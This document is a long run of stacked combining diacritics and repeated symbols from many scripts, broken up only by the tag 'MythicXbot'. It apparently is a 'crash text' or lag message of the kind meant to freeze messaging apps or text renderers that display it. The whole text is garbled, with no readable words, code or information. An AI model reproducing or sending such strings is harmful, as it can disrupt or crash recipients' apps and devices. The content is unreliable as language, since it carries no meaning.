ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ